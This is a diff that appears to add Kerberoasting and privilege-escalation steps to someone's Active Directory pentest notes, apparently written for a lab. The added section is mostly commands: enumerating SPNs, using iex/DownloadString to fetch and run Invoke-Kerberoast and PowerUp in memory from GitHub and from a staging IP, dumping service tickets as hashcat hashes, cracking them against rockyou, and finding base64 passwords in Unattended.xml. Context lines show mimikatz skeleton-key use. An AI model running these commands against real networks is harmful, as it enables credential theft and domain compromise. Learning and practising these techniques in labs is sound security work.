@@ -233,6 +233,50 @@ net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
 dir \\Desktop-1\c$ /user:Machine1 mimikatz 
 ````
 - The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques
+### Service Principle Name SPN
+- Lets first enumerate Windows. If we run 
+````
+setspn -T medin -Q */* 
+````
+- We can extract all accounts in the SPN.  SPN is the Service Principal Name, and is the mapping between service and account.
+- Now we have seen there is an SPN for a user, we can use Invoke-Kerberoast and get a ticket.
+- Lets first get the Powershell Invoke-Kerberoast script.
+````
+iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
+powershell Invoke-WebRequest -Uri http://10.13.22.22:8000/Invoke-Kerberoast.ps1 -OutFile C:\Windows\System32\spool\drivers\color\Invoke-Kerberoast.ps1
+````
+- Now lets load this into memory: 
+````
+. .\Invoke-Kerberoast.ps1
+Invoke-Kerberoast -OutputFormat hashcat |fl
+````
+- You should get a SPN ticket. 
+- Crack with hashcat
+````
+hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+````
+## Priv Esc
+- We will run PowerUp.ps1 for the enumeration.
+- Lets load PowerUp1.ps1 into memory.
+````
+iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1') 
+````
+- Load into memory
+````
+. .\PowerUp.ps1
+Invoke-AllChecks
+````
+- Unattended Setup is the method by which original equipment manufacturers (OEMs), corporations, and other users install Windows NT in unattended mode." 
+
+It is also where users passwords are stored in base64. Navigate to:
+````
+C:\Windows\Panther\Unattend\Unattended.xml.
+````
+
+
+
+
+
 ### Resources
 - https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a
 - https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
